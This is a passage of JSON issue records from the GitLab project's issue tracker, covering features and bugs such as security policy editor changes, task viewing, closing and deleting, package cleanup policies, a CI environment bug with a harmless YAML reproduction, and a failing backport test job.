[text](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/assets/javascripts/threat_monitoring/components/policy_editor/scan_execution_policy/scan_execution_policy_editor.vue#L21) from `Create merge request` to `Create via Merge Request`","state":"closed","created_at":"2021-11-19T21:27:41.130Z","updated_at":"2022-01-18T07:03:25.273Z","closed_at":"2022-01-04T23:20:08.230Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Deliverable","Enterprise Edition","GitLab Ultimate","auto updated","devops::govern","frontend","frontend-weight::2","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346160","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346160","notes":"https://gitlab.com/api/v4/projects/278964/issues/346160/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346160/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346160","relative":"#346160","full":"gitlab-org/gitlab#346160"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7147,"epic":{"id":388086,"iid":7147,"title":"Help users select an initial policy type","url":"/groups/gitlab-org/-/epics/7147","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652542,"iid":346159,"project_id":278964,"title":"Follow-up: Allow users to edit an existing policy's type and add warning when changing a new policy's type","description":"## Why are we doing this work\n- when users go to edit an existing policy, they expect to be also to change the type for a policy that is saved in the Security Policy Project\n- this does NOT include `Container Network` type policies\n- when a user changes the type of a new policy, they are not warned that it will remove all of their data\n\n## Relevant links\n- [Design Issue](https://gitlab.com/groups/gitlab-org/-/epics/7147)\n\n## Non-functional requirements\n- [ ] Documentation:\n- [ ] Testing:\n\n## Implementation plan\n- [ ] ~frontend enable clicking on `Step1` when editing a new/existing policy for non-container network policies\n- [ ] ~frontend Show warning modal before allowing a user to change the policy type\n    - `If you change to a new policy type (\u003cNEW_TYPE\u003e), the currently saved content in the \u003cOLD_TYPE\u003e policy will be lost. Are you sure you want to change to \u003cNEW_TYPE\u003e type?`\n- [ ] ~frontend disable allowing a user to change a policy type to a `container network` policy","state":"closed","created_at":"2021-11-19T21:27:32.231Z","updated_at":"2022-04-11T03:34:19.896Z","closed_at":"2022-04-06T16:47:53.561Z","closed_by":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"labels":["Enterprise Edition","GitLab Ultimate","[deprecated] Accepting merge requests","auto updated","devops::govern","frontend","frontend-weight::3","group::security policies","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":1212252,"iid":48,"group_id":9970,"title":"Next 1-3 releases","description":"Issues which are not quite ready to schedule, but should be considered as part of the near-term roadmap.","state":"active","created_at":"2020-03-26T20:39:10.889Z","updated_at":"2020-03-26T20:39:10.889Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/48"},"assignees":[],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346159","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346159","notes":"https://gitlab.com/api/v4/projects/278964/issues/346159/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346159/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346159","relative":"#346159","full":"gitlab-org/gitlab#346159"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7147,"epic":{"id":388086,"iid":7147,"title":"Help users select an initial policy type","url":"/groups/gitlab-org/-/epics/7147","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97651144,"iid":346158,"project_id":278964,"title":"View a Task (detail page)","description":"\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n\n## Problem to Solve\n\nOnce a task is created, there needs to be a way to view it.\n\n## Proposal\n\n- If task is in issue, open task detail in modal/sidebar\n- If task is anywhere else, open in direct route `-/work_item/...`\n\n## Acceptance Criteria\n\n- [x] ~When clicking through to Task detail view from anywhere other than issue detail, load the Task at the `/work_item/123/ route.`~ — moved to https://gitlab.com/gitlab-org/gitlab/-/issues/356627\n- [x] The title is visible in the task detail view\n- [x] When clicking on task (referenced from issue detail view), load task detail view in modal/sidebar https://gitlab.com/gitlab-org/gitlab/-/merge_requests/80727\n- [x] FE Event trackers https://gitlab.com/gitlab-org/gitlab/-/merge_requests/80727\n- [x] Enable Title to be updated real-time via Subscriptions https://gitlab.com/gitlab-org/gitlab/-/merge_requests/83546\n- [x] Add a route to a task within an issue. A user can view any work item in a modal on any issue page https://gitlab.com/gitlab-org/gitlab/-/merge_requests/83988\n\n## FE Event Trackers\n\nInstead of having events, we should get both routes for free as page views in Snowplow. Just ensure that we don't need to manually trigger the pageview event on route changes in vue router.\n\n\u003cdetails\u003e\u003csummary\u003ePrevious event definitions\u003c/summary\u003e\n\n```\ncategory: workItems:show\nlabel: work_item_view\naction: viewed_work_item_from_modal\nproperty: [type_{{insert issue type}}]\n\n```\n\n```\ncategory: workItems:show\nlabel: work_item_view\naction: viewed_work_item_from_direct_route\nproperty: [type_{{insert issue type}}]\n\n```\n\n\u003c/details\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?--\u003e\n\n- Same permissions as existing issue permissions. \n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html\nAdd all known Documentation Requirements here, per https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\nIf this feature requires changing permissions, this document https://docs.gitlab.com/ee/user/permissions.html must be updated accordingly. --\u003e\n\n- Maybe?\n\n### Testing\n\n\u003c!-- What risks does this change pose? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing? See the test engineering process for further help: https://about.gitlab.com/handbook/engineering/quality/test-engineering/ --\u003e\n\n- Necessary unit and end-to-end tests \n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n- Work items are not yet a stage where we will be measuring quantitatively.\n\n\n### Tiers\n\n- Core Work Item view, default issue types (Task will be a default), and \"related\" `Task` issues is ~19953071 \n- Parent/child relationships are ~2278657, which is consistent with single level epics\n\n---\n# Engineering Implementation Details","state":"closed","created_at":"2021-11-19T20:38:02.892Z","updated_at":"2022-04-18T07:00:49.251Z","closed_at":"2022-04-13T17:04:05.854Z","closed_by":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"labels":["Category:Issue Tracking","Category:Portfolio Management","Category:Team Planning","Deliverable","GitLab Free","GitLab Premium","Technical Writing","backend","backend complete","devops::plan","documentation","epics","frontend","group::project management","missed-deliverable","missed:14.8","section::dev","tw-weight::5","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4545397,"username":"cngo","name":"Coung Ngo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4545397/avatar.png","web_url":"https://gitlab.com/cngo"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":4545397,"username":"cngo","name":"Coung Ngo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4545397/avatar.png","web_url":"https://gitlab.com/cngo"},"user_notes_count":6,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346158","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":6},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"6 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346158","notes":"https://gitlab.com/api/v4/projects/278964/issues/346158/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346158/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346158","relative":"#346158","full":"gitlab-org/gitlab#346158"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7083,"epic":{"id":381451,"iid":7083,"title":"🚀   Open Tasks in Issues to view and manage Title","url":"/groups/gitlab-org/-/epics/7083","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":48485,"iid":60,"sequence":13,"group_id":9970,"title":"Iteration 13","description":null,"state":3,"created_at":"2022-02-15T00:05:01.808Z","updated_at":"2022-04-27T00:05:02.371Z","start_date":"2022-04-13","due_date":"2022-04-26","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/48485"},"health_status":null},{"id":97648124,"iid":346153,"project_id":278964,"title":"Cleanup policy objects + background job for execution.","description":"### Context\n\nAs part of the work to deliver the MVC of cleanup policies for packages, we need to create the policy objects and background jobs for execution.\n\n### Proposal \n\n1. Cleanup policy objects + background job for execution. Weight `2`.\n   * :warning: same thing here, we need logged statistics to monitor the load (how many cleanup policies to execute) they are at any time.\n   * Regarding the cleanup policy parameter, we need some accuracy. Even though the UI, present it as `number of packages to keep`, it might be a good idea to have it named `n_package_files_to_keep` in the model.\n      * The reasoning is that at some point, we will have a parameter to keep the `n` most recent _versions_. If we use `n_packages_to_keep`, this can be confusing.\n1. ~GraphQL queries for cleanup policy objects. Weight `1`.\n   * This could be with the MR above but ~GraphQL MRs for shiny new objects tend to be quite massive. This huge code change could make the MR above grow out of bounds (eg. this is too big for a review).\n\nRelated to #342436.","state":"closed","created_at":"2021-11-19T19:02:49.538Z","updated_at":"2022-07-21T12:03:59.621Z","closed_at":"2022-07-20T07:49:17.389Z","closed_by":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"labels":["Category:Package Registry","Deliverable","GraphQL","Package:P1","backend","devops::package","group::package registry","rails","section::ops","type::feature","workflow::verification"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":84,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346153","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346153","notes":"https://gitlab.com/api/v4/projects/278964/issues/346153/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346153/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346153","relative":"#346153","full":"gitlab-org/gitlab#346153"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5152,"epic":{"id":177448,"iid":5152,"title":"Package Registry cleanup policies MVC","url":"/groups/gitlab-org/-/epics/5152","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97647811,"iid":346152,"project_id":278964,"title":"Merging triggers manual environment on_stop action","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nCertain projects configured with a `action: prepare` job for their environments cause other jobs that stop that same environment to be automatically triggered even when they are configured for `when: manual`.\n\n### Steps to reproduce\n\n1. add this YML to repo in dev branch Create a project with a `.gitlab-ci.yml` file similar to the one below.\n1. Create a new `dev` branch.\n1. Run a new pipeline and trigger the `Plan DEV` and `Apply DEV` jobs, which deploys an environment.\n1. Create a new merge request into the `dev` branch.\n1. Merge the MR.\n1. Observe that the manual `Stop DEV` job is run automatically.\n1. Optionally, comment out the `action: prepare` line of the `Plan DEV` job and run a new pipeline.\n1. Observe that the `Stop DEV` job is not run automatically.\n\n```YAML\nstages:\n    - plan\n    - apply\n\nimage:\n    name: ${CI_DEPENDENCY_PROXY_GROUP_IMAGE_PREFIX}/alpine\n\nPlan DEV:\n# Comment out environment and needs and the pipeline will NOT trigger a STOP on a previously deployed environment when you merge into dev branch\n    environment:\n        name: dev\n        action: prepare\n    needs: []\n    stage: plan\n    script:\n        - echo \"PLAN DEV! ${CI_COMMIT_BRANCH}\"\n    rules:\n        - if: '$CI_COMMIT_BRANCH == \"master\" || $CI_COMMIT_BRANCH == \"main\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"master\" || $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == \"main\"'\n          when: never\n        - when: on_success\n\nApply DEV:\n    stage: apply\n    script:\n        - echo \"APPLY DEV! ${CI_COMMIT_BRANCH}\"\n    environment:\n        name: dev\n        on_stop: Stop DEV\n    dependencies:\n        - Plan DEV\n    rules:\n        - if: $CI_COMMIT_BRANCH\n          when: manual\n\nStop DEV:\n    stage: apply\n    script:\n        - echo \"STOP DEV! ${CI_COMMIT_BRANCH}\"\n    environment:\n        name: dev\n        action: stop\n    rules:\n        - if: $CI_COMMIT_BRANCH\n          when: manual\n```\n\n### What is the current *bug* behavior?\n\nJobs that stop an environment are automatically run in the presence of the `action: prepare` keyword.\n\n### What is the expected *correct* behavior?\n\nJobs that are defined to run manually should not be triggered automatically.\n\n### Output of checks\n\nThis bug happens on GitLab.com: `14.5.0-pre 9df5f28f557`","state":"closed","created_at":"2021-11-19T18:51:48.349Z","updated_at":"2022-07-08T10:12:15.932Z","closed_at":"2022-04-18T05:34:30.784Z","closed_by":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"labels":["Category:Continuous Delivery","Deliverable","Next Up","customer","devops::release","environments","group::release","priority::2","regression","regression:14.9","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"}],"author":{"id":2390023,"username":"tristan","name":"Tristan Williams","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2390023/avatar.png","web_url":"https://gitlab.com/tristan"},"type":"ISSUE","assignee":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"user_notes_count":30,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346152","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346152","notes":"https://gitlab.com/api/v4/projects/278964/issues/346152/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346152/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346152","relative":"#346152","full":"gitlab-org/gitlab#346152"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97633518,"iid":346134,"project_id":278964,"title":"Close / Re-Open Task","description":"### Problem to solve\n\nThere is no way to close a Task or re-open it\n\n### Proposal\n\nProvide a way for users to close a Task and re-open it.\n\n### GraphQL Mutation\n\nAgreed upon schema:\n\n```\nmutation {\n  workItemUpdate(input: { id: \"gid://gitlab/WorkItem/1\", stateEvent: CLOSE }) {\n    workItem {\n      title\n      id\n      title\n    }\n  }\n}\n```\n\n### Acceptance\n\n- [ ] User can close and re-open Task\n    some\n    thing else\n- [ ] Mobile styles\n- [ ] Desktop styles\n- [ ] Task state updates in real-time\n- [ ] FE Trackers","state":"closed","created_at":"2021-11-19T15:10:32.462Z","updated_at":"2022-07-05T16:07:50.036Z","closed_at":"2022-04-26T22:06:18.334Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Category:Team Planning","Deliverable","auto updated","backend","backend complete","devops::plan","documentation","frontend","group::project management","missed-deliverable","missed:14.10","missed:14.8","missed:14.9","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"},"user_notes_count":23,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346134","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346134","notes":"https://gitlab.com/api/v4/projects/278964/issues/346134/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346134/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346134","relative":"#346134","full":"gitlab-org/gitlab#346134"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7169,"epic":{"id":390060,"iid":7169,"title":"🚀 Manage a Task","url":"/groups/gitlab-org/-/epics/7169","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":48485,"iid":60,"sequence":13,"group_id":9970,"title":"Iteration 13","description":null,"state":3,"created_at":"2022-02-15T00:05:01.808Z","updated_at":"2022-04-27T00:05:02.371Z","start_date":"2022-04-13","due_date":"2022-04-26","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/48485"},"health_status":null},{"id":97633490,"iid":346132,"project_id":278964,"title":"Delete a Task","description":"### Problem to solve\n\nThere is no way to delete a Task.\n\n### Proposal\n\n- Provide a way for users with the appropriate permissions to delete a Task.\n- New: Authors can delete their own work items (Tasks in this case) \n\n### GraphQL\n\n- Mutation available `workItemDelete`\n\n### Acceptance\n\n- [ ] Authorized user can delete a Task. Unauthorized users cannot. \n- [ ] Mobile styles\n- [ ] Desktop styles\n- [ ] Elipsis menu is present whenever the work item is opened (currently missing from the `/work_items/` detail view.\n- [ ] FE Trackers","state":"closed","created_at":"2021-11-19T15:09:49.045Z","updated_at":"2022-08-18T03:58:19.002Z","closed_at":"2022-05-12T01:53:11.927Z","closed_by":{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"},"labels":["Category:Team Planning","Deliverable","auto updated","backend","backend complete","devops::plan","documentation","frontend","group::project management","missed-deliverable","missed:14.10","missed:14.8","missed:14.9","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"},"user_notes_count":67,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346132","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346132","notes":"https://gitlab.com/api/v4/projects/278964/issues/346132/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346132/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346132","relative":"#346132","full":"gitlab-org/gitlab#346132"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7169,"epic":{"id":390060,"iid":7169,"title":"🚀 Manage a Task","url":"/groups/gitlab-org/-/epics/7169","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":{"id":51126,"iid":64,"sequence":15,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-03-15T00:05:02.134Z","updated_at":"2022-05-25T00:05:02.157Z","start_date":"2022-05-11","due_date":"2022-05-24","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/51126"},"health_status":null},{"id":97617502,"iid":346119,"project_id":278964,"title":"compile-test-assets as-if-jh fails for 14.4 backports","description":"The compile-test-assets as-if-jh job is failing in 14-4-stable-ee: https://gitlab.com/gitlab-org/security/gitlab/-/jobs/1799215651 and https://gitlab.com/gitlab-org/security/gitlab/-/jobs/1799588932 are two examples.\n\nThis will block the security release as all 14.4 backports have failing pipelines.\n\nOn Slack, @engwan suggested:\n\n\u003e Looks like it’s pulling the Gemfile from master? Maybe we shouldn’t run this job on old branches?\n\nIf we don't do that, we at least need a backport for https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74107.","state":"closed","created_at":"2021-11-19T12:31:23.541Z","updated_at":"2021-11-25T21:47:22.146Z","closed_at":"2021-11-23T13:19:36.384Z","closed_by":{"id":443319,"username":"smcgivern","name":"Sean McGivern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/443319/avatar.png","web_url":"https://gitlab.com/smcgivern"},"labels":["Engineering Productivity","test"],"milestone":null,"assignees":[{"id":443319,"username":"smcgivern","name":"Sean McGivern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/443319/avatar.png","web_url":"https://gitlab.com/smcgivern"}],"author":{"id":443319,"username":"smcgivern","name":"Sean McGivern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/443319/avatar.png","web_url":"https://gitlab.com/smcgivern"},"type":"ISSUE","assignee":{"id":443319,"username":"smcgivern","name":"Sean 